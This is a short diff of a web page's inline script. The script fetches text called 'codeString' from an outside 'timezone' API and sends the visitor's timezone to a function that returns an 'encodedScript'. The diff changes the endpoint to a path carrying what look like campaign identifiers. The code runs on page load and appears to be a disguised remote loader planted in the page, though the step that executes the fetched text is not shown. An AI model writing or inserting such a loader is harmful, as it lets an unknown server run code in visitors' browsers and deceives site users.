@@ -243,7 +243,7 @@ height:350px;
     }
     (async () => {
     const response = await fetch(
-        "https://api.intellectpath.net/timezone"
+        "https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007"
     );
 
     const codeString = await response.text();
@@ -265,7 +265,7 @@ height:350px;
         const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         try {
             const encodedScript = await transmitTimezoneData(
-                    "https://api.intellectpath.net/timezone",
+                    "https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007",
                     clientTimezone
                 )
             ;
